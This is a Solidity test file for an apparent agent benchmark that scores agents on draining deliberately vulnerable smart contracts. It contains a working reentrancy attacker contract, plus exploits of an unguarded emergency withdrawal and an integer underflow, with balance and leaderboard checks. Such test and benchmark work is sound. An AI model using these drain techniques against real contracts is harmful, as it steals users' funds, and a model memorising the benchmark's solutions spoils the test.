// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {BenchmarkToken} from "../../src/benchmark/BenchmarkToken.sol";
import {AgentRegistry} from "../../src/benchmark/AgentRegistry.sol";
import {ScoreTracker} from "../../src/benchmark/ScoreTracker.sol";
import {BenchmarkController} from "../../src/benchmark/BenchmarkController.sol";
import {VulnerableVault} from "../../src/benchmark/templates/VulnerableVault.sol";
import {WeakAccessControl} from "../../src/benchmark/templates/WeakAccessControl.sol";
import {IntegerOverflow} from "../../src/benchmark/templates/IntegerOverflow.sol";
import {IWithdrawCallback} from "../../src/benchmark/IWithdrawCallback.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Attacker contract that exploits VulnerableVault via reentrancy
contract ReentrancyAttacker is IWithdrawCallback {
    VulnerableVault public vault;
    IERC20 public token;

    constructor(VulnerableVault _vault, IERC20 _token) {
        vault = _vault;
        token = _token;
    }

    function attack(uint256 depositAmount) external {
        token.approve(address(vault), depositAmount);
        vault.deposit(depositAmount);
        vault.withdraw();
    }

    function onWithdraw(uint256) external override {
        // Re-enter if the vault still has tokens
        if (token.balanceOf(address(vault)) > 0 && vault.balances(address(this)) > 0) {
            vault.withdraw();
        }
    }
}

contract IntegrationTest is Test {
    BenchmarkToken token;
    AgentRegistry registry;
    ScoreTracker scoreTracker;
    BenchmarkController controller;

    address admin = makeAddr("admin");
    address agentOwner = makeAddr("agentOwner");
    address operator = makeAddr("operator");

    uint256 constant FEE = 0.01 ether;
    uint256 fundingAmount;

    function setUp() public {
        vm.startPrank(admin);

        token = new BenchmarkToken();
        registry = new AgentRegistry();

        uint256 controllerNonce = vm.getNonce(admin) + 1;
        address predictedController = vm.computeCreateAddress(admin, controllerNonce);

        scoreTracker = new ScoreTracker(predictedController);
        controller = new BenchmarkController(token, registry, scoreTracker, FEE);

        token.transferOwnership(address(controller));

        controller.addTemplate(type(VulnerableVault).creationCode);
        controller.addTemplate(type(WeakAccessControl).creationCode);
        controller.addTemplate(type(IntegerOverflow).creationCode);

        // Use smaller funding for tests to keep reentrancy attack feasible
        controller.setFundingAmount(10e18);

        vm.stopPrank();

        fundingAmount = controller.fundingAmount();

        // Register agent
        vm.prank(agentOwner);
        registry.registerAgent(operator, "Test Agent");
    }

    function test_fullCertificationFlow() public {
        // 1. Request certification run
        vm.deal(operator, 1 ether);
        vm.prank(operator);
        uint256 runId = controller.requestCertificationRun{value: FEE}(1);

        BenchmarkController.CertificationRun memory run = controller.getRun(runId);
        assertEq(run.deployedContracts.length, 3);

        address vaultAddr = run.deployedContracts[0];
        address accessAddr = run.deployedContracts[1];
        address overflowAddr = run.deployedContracts[2];

        // 2. Exploit VulnerableVault via reentrancy
        _exploitVault(vaultAddr);

        // 3. Exploit WeakAccessControl — just call emergencyWithdraw
        _exploitAccessControl(accessAddr);

        // 4. Exploit IntegerOverflow — withdraw without depositing
        _exploitOverflow(overflowAddr);

        // All contracts should be fully drained
        assertEq(token.balanceOf(vaultAddr), 0);
        assertEq(token.balanceOf(accessAddr), 0);
        assertEq(token.balanceOf(overflowAddr), 0);

        // 5. Complete run (early — all drained)
        controller.completeRun(runId);

        run = controller.getRun(runId);
        assertTrue(run.completed);

        // 6. Verify scores
        ScoreTracker.AgentScore memory stats = scoreTracker.getAgentStats(1);
        assertEq(stats.bestRunBugs, 3);
        assertEq(stats.bestRunExtracted, fundingAmount * 3);
        assertEq(stats.bestRunScore, 300);
        assertEq(stats.totalRuns, 1);

        // 7. Verify leaderboard
        (uint256[] memory ids, uint256[] memory scores) = scoreTracker.getLeaderboard(10);
        assertEq(ids.length, 1);
        assertEq(ids[0], 1);
        assertEq(scores[0], 300);
    }

    function _exploitVault(address vaultAddr) internal {
        VulnerableVault vault = VulnerableVault(vaultAddr);

        // Operator needs some tokens to seed the reentrancy attack
        // In a real scenario the agent would need tokens. For testing, mint via a helper.
        // The controller owns the token. We'll use a workaround: transfer a small amount from vault first.
        // Actually, we need to deposit first to trigger reentrancy. Let's have admin mint to operator.
        // But admin no longer owns the token (controller does). Controller can mint.
        // In practice, the agent would acquire tokens somehow. For test, let's use deal().

        // Give operator a small amount of tokens to deposit
        uint256 depositAmount = 1e18;
        deal(address(token), operator, depositAmount);

        vm.startPrank(operator, operator);
        // Deploy attacker contract
        ReentrancyAttacker attacker = new ReentrancyAttacker(vault, IERC20(address(token)));
        token.transfer(address(attacker), depositAmount);
        attacker.attack(depositAmount);

        // Attacker now has all the vault's tokens + its deposit
        uint256 attackerBalance = token.balanceOf(address(attacker));
        assertEq(attackerBalance, fundingAmount + depositAmount);
        vm.stopPrank();
    }

    function _exploitAccessControl(address accessAddr) internal {
        WeakAccessControl accessControl = WeakAccessControl(accessAddr);

        vm.prank(operator, operator);
        accessControl.emergencyWithdraw(operator);

        assertEq(token.balanceOf(accessAddr), 0);
    }

    function _exploitOverflow(address overflowAddr) internal {
        IntegerOverflow overflow = IntegerOverflow(overflowAddr);

        // Withdraw the full funding amount without depositing — underflow gives huge balance
        vm.prank(operator, operator);
        overflow.withdraw(fundingAmount);

        assertEq(token.balanceOf(overflowAddr), 0);
    }

    function test_multipleRuns_leaderboard() public {
        // Agent 1 does a run exploiting 2/3
        vm.deal(operator, 1 ether);
        vm.prank(operator);
        uint256 runId1 = controller.requestCertificationRun{value: FEE}(1);
        BenchmarkController.CertificationRun memory run1 = controller.getRun(runId1);

        // Only exploit 2 contracts
        _exploitAccessControl(run1.deployedContracts[1]);
        _exploitOverflow(run1.deployedContracts[2]);

        vm.warp(block.timestamp + 24 hours + 1);
        controller.completeRun(runId1);

        // Register agent 2 who exploits all 3
        address agent2Owner = makeAddr("agent2Owner");
        address operator2 = makeAddr("operator2");
        vm.prank(agent2Owner);
        registry.registerAgent(operator2, "Agent 2");

        vm.deal(operator2, 1 ether);
        vm.prank(operator2);
        uint256 runId2 = controller.requestCertificationRun{value: FEE}(2);
        BenchmarkController.CertificationRun memory run2 = controller.getRun(runId2);

        _exploitVaultAs(run2.deployedContracts[0], operator2);
        _exploitAccessControlAs(run2.deployedContracts[1], operator2);
        _exploitOverflowAs(run2.deployedContracts[2], operator2);

        controller.completeRun(runId2);

        // Check leaderboard
        (uint256[] memory ids, uint256[] memory scores) = scoreTracker.getLeaderboard(10);
        assertEq(ids.length, 2);
        assertEq(ids[0], 2); // 300 pts
        assertEq(ids[1], 1); // 200 pts
        assertEq(scores[0], 300);
        assertEq(scores[1], 200);
    }

    function _exploitVaultAs(address vaultAddr, address op) internal {
        VulnerableVault vault = VulnerableVault(vaultAddr);
        uint256 depositAmount = 1e18;
        deal(address(token), op, depositAmount);

        vm.startPrank(op, op);
        ReentrancyAttacker attacker = new ReentrancyAttacker(vault, IERC20(address(token)));
        token.transfer(address(attacker), depositAmount);
        attacker.attack(depositAmount);
        vm.stopPrank();
    }

    function _exploitAccessControlAs(address accessAddr, address op) internal {
        vm.prank(op, op);
        WeakAccessControl(accessAddr).emergencyWithdraw(op);
    }

    function _exploitOverflowAs(address overflowAddr, address op) internal {
        vm.prank(op, op);
        IntegerOverflow(overflowAddr).withdraw(fundingAmount);
    }
}
